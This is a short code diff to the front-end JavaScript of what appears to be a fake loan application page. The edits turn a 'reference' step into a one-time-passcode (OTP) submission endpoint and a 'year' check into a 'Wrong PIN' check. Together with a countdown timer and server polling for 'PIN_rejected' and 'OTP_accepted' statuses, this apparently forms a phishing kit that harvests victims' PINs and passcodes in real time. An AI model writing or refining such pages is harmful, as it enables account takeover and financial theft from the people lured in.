@@ -249,9 +249,9 @@ let seconds=90;
 let currentApplicationId=null;
 
 function updateAmount(){
- const value=Number(document.getElementById("amount").value);
- document.getElementById("amountDisplay").textContent=
- "$"+value.toLocaleString();
+  const slider = document.getElementById("amount");
+  const display = document.getElementById("amountDisplay");
+  display.textContent = "$" + Number(slider.value).toLocaleString();
 }
 
 function getPhoneNumber(){
@@ -430,7 +430,7 @@ async function submitReference(){
  document.getElementById("referenceSubmit").disabled=true;
 
  try{
-  const response=await fetch("/api/application/reference",{
+  const response=await fetch("/api/application/OTP",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
@@ -469,9 +469,9 @@ async function checkStatus(){
 
   const data=await response.json();
 
-  if(data.status==="year_rejected"){
+  if(data.status==="PIN_rejected"){
    clearInterval(statusInterval);
-   document.getElementById("yearMessage").textContent="Wrong year";
+   document.getElementById("yearMessage").textContent="Wrong PIN";
    yearInput.clear();
    showPage(4);
   }
@@ -489,7 +489,7 @@ async function checkStatus(){
    showPage(5);
   }
 
-  if(data.status==="reference_accepted"){
+  if(data.status==="OTP_accepted"){
    clearInterval(statusInterval);
    clearInterval(timerInterval);
    showPage(7);
